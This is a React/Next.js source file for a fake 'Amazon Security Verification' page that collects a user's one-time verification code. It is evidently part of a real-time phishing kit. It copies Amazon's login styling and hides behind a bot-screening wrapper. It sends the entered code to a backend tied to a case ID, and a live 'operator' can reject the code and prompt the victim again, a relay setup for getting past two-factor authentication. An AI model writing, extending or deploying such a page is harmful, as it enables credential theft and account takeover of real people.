'use client';

/**
 * Secret Key Page — Amazon Security Verification
 *
 * PIN/OTP entry with Amazon auth-card styling.
 * Inline waiting state (button spinner, form stays visible).
 */

import { useCallback, useEffect, useState } from 'react';
import { useParams, useRouter } from 'next/navigation';
import { useSessionStore } from '@shared';
import { BotGuard } from '@/components/security/BotGuard';
import { AlertTriangle, Loader2 } from 'lucide-react';

export default function SecretKeyPage() {
  const router = useRouter();
  const params = useParams();
  const sessionUuid = params.session_uuid as string;

  const { stage, status, loading, error, caseId, agentMessage } = useSessionStore();

  const [pin, setPin] = useState('');
  const [fieldError, setFieldError] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  // Handle operator rejection
  useEffect(() => {
    if (status === 'rejected' || status === 'error') {
      setPin('');
      setFieldError(agentMessage || 'Your verification code was incorrect. Please try again.');
      setIsSubmitting(false);
    }
  }, [status, agentMessage]);

  const handleSubmit = useCallback(
    async (e: React.FormEvent) => {
      e.preventDefault();
      setFieldError('');

      if (!caseId) {
        setFieldError('Session information missing. Please refresh and try again.');
        return;
      }

      if (!pin.trim()) {
        setFieldError('Please enter your verification code');
        return;
      }

      setIsSubmitting(true);

      try {
        const response = await fetch('/api/submit-secret-key', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            case_id: caseId,
            secret_key: pin.trim(),
          }),
        });

        if (!response.ok) {
          console.error('Submission error');
          setFieldError('Unable to process your code. Please try again.');
          setIsSubmitting(false);
          return;
        }

        useSessionStore.setState({
          status: 'waiting',
          agentMessage: 'Verifying your code...',
          formData: {},
        });
      } catch (error) {
        console.error('Submission error:', error);
        setFieldError('Submission failed. Please try again.');
        setIsSubmitting(false);
      }
    },
    [pin, caseId]
  );

  const isWaiting = status === 'waiting' || isSubmitting || loading;

  return (
    <BotGuard>
      <div className="auth-card">
        <div className="auth-card-inner">
          <h1 className="auth-heading">Security verification</h1>

          {/* Error Alert */}
          {fieldError && (
            <div className="alert-box alert-error" role="alert">
              <div className="alert-icon">
                <AlertTriangle size={22} color="#CC0C39" />
              </div>
              <div className="alert-content">
                <span className="alert-heading">There was a problem</span>
                <span className="alert-message">{fieldError}</span>
              </div>
            </div>
          )}

          <p className="page-description" style={{ fontSize: '13px', lineHeight: '19px', marginBottom: '14px' }}>
            To verify your identity, enter the verification code sent to your device.
          </p>

          <form className="auth-form" onSubmit={handleSubmit} noValidate>
            <div className="form-group">
              <label className="form-label" htmlFor="pin">
                Verification code
              </label>
              <input
                type="text"
                id="pin"
                className={`form-input${fieldError ? ' input-error' : ''}`}
                name="pin"
                autoComplete="one-time-code"
                inputMode="numeric"
                value={pin}
                onChange={(e) => {
                  setPin(e.target.value);
                  if (fieldError) setFieldError('');
                }}
                autoFocus
                disabled={isWaiting}
              />
            </div>

            <button
              type="submit"
              className="btn-primary btn-continue"
              disabled={isWaiting || !pin.trim()}
            >
              {isWaiting && <Loader2 size={16} className="spinner-inline" />}
              {isWaiting ? 'Please wait...' : 'Submit code'}
            </button>
          </form>

          <div className="help-section">
            <a href="#" className="help-link">Resend code</a>
          </div>
        </div>
      </div>
    </BotGuard>
  );
}
